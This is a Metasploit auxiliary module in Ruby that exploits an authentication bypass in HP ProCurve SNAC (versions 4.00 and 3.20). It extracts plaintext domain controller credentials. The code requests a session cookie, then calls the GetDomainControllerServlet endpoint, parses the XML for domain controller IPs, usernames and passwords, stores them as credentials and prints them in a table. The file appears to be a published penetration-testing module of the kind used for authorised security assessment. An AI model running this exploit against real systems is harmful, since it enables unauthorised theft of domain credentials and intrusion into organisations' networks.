##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP ProCurve SNAC Domain Controller Credential Dumper',
      'Description'    => %q{
        This module will extract Domain Controller credentials from vulnerable installations of HP
        SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability
        has been used to exploit remote file uploads. This vulnerability can be used to gather important
        information handled by the vulnerable application, like plain text domain controller
        credentials. This module has been tested successfully with HP SNAC included with ProCurve
        Manager 4.0.
      },
      'References'     =>
        [
          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03897409']
        ],
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Auth bypass discovered by
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
        },
      'DisclosureDate' => '2013-09-09'
    ))

    register_options(
      [
        Opt::RPORT(443)
      ])
  end

  def get_domain_info(session)
    res = send_request_cgi({
      'uri' => "/RegWeb/RegWeb/GetDomainControllerServlet",
      'cookie' => session
    })

    if res and res.code == 200 and res.body =~ /domainName/
      return res.body
    end

    return nil
  end

  def get_session
    res = send_request_cgi({ 'uri' => "/RegWeb/html/snac/index.html" })
    session = nil
    if res and res.code == 200
      session = res.get_cookies
    end

    if session and not session.empty?
      return session
    end

    return nil
  end

  def parse_domain_data(data)
    results = []
    doc = REXML::Document.new(data)

    doc.elements.each("Controllers/Domain") do |domain|
      dc_ip = domain.elements['domainControllerIP'].text
      port = domain.elements['port'].text
      service = domain.elements['connType'].text
      user = domain.elements['userName'].text
      password = domain.elements['password'].text
      results << [dc_ip, port, service, user, password]
    end

    return results
  end


  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def run

    print_status("Get Domain Info")
    session = get_session

    if session.nil?
      print_error("Failed to get a valid session, maybe the target isn't HP SNAC installation?")
      return
    end

    print_status("Exploiting Authentication Bypass to gather Domain Controller Info...")
    domain_info = get_domain_info(session)

    if domain_info.nil?
      print_error("Failed, maybe the target isn't vulnerable")
      return
    end

    print_status("Parsing data gathered...")
    credentials = parse_domain_data(domain_info)

    if credentials.empty?
      print_warning("Any Domain Controller has been found...")
      return
    end

    cred_table = Rex::Text::Table.new(
      'Header'  => 'Domain Controllers Credentials',
      'Indent'  => 1,
      'Columns' => ['Domain Controller', 'Username', 'Password']
    )

    credentials.each do |record|
      report_cred(
        ip: record[0],
        port: record[1],
        service_name: record[2].downcase,
        user: record[3],
        password: record[4],
        proof: domain_info.inspect
      )
      cred_table << [record[0], record[3], record[4]]
    end

    print_line
    print_line(cred_table.to_s)

  end
end
